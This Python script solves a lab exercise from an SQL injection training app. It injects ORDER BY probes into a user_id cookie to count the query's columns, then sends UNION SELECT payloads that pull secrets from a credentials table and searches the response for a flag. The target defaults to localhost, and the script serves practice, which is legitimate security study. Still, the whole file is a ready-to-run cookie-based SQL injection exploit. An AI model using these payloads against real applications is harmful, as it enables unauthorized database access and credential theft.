#!/usr/bin/env python3
"""
Lab 17 -- Header Injection: Cookie
==================================
Extracts credentials via UNION injection in the user_id cookie.
The application reads the cookie value and uses it directly in a
SQL query without sanitization.

Usage:
    python3 lab17_header_cookie.py [TARGET_URL]

Default target: http://localhost/SQLi-Arena/public/lab.php
"""
import requests
import sys
import re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/SQLi-Arena/public/lab.php"
PARAMS = {"lab": "mysql/lab17", "mode": "black"}


def step1_confirm_injection():
    """Confirm the cookie is used in a SQL query by testing ORDER BY."""
    print("[*] Step 1: Confirming cookie injection point...")

    # Normal cookie
    r = requests.get(TARGET, params=PARAMS, cookies={"user_id": "user1"})
    if "dark" in r.text or "Theme" in r.text:
        print("[+] Normal cookie works -- user preferences returned")
    else:
        print("[*] Note: user1 may not exist, but that's okay")

    # Test ORDER BY to find column count
    for n in range(1, 6):
        cookie = f"' ORDER BY {n} -- -"
        r = requests.get(TARGET, params=PARAMS, cookies={"user_id": cookie})
        if "error" in r.text.lower() or "Error" in r.text:
            print(f"[+] ORDER BY {n} failed → query has {n-1} columns")
            return n - 1

    print("[*] Could not determine column count via ORDER BY, assuming 3")
    return 3


def step2_union_extract(num_cols):
    """Use UNION SELECT to extract credentials via cookie injection."""
    print(f"\n[*] Step 2: UNION SELECT with {num_cols} columns...")

    payload = "' UNION SELECT secret, service, NOW() FROM credentials WHERE service='database' -- -"
    print(f"[*] Cookie payload: user_id={payload}")
    print()

    r = requests.get(TARGET, params=PARAMS, cookies={"user_id": payload})

    # Look for the flag
    match = re.search(r"FLAG\{[^}]+\}", r.text)
    if match:
        return match.group(0)

    # Try alternative column arrangements
    alternatives = [
        "' UNION SELECT secret, service, NOW() FROM credentials -- -",
        "' UNION SELECT 1, secret, NOW() FROM credentials WHERE service='database' -- -",
        "' UNION SELECT secret, 2, 3 FROM credentials WHERE service='database' -- -",
    ]
    for alt in alternatives:
        r = requests.get(TARGET, params=PARAMS, cookies={"user_id": alt})
        match = re.search(r"FLAG\{[^}]+\}", r.text)
        if match:
            return match.group(0)

    return None


# ── Main ──
print(f"[*] Target: {TARGET}")
print("[*] Injection point: Cookie header (user_id)")
print()

num_cols = step1_confirm_injection()
flag = step2_union_extract(num_cols)

if flag:
    print(f"\n[+] Flag: {flag}")
else:
    print("\n[-] Could not extract flag. Check lab setup.")
    sys.exit(1)
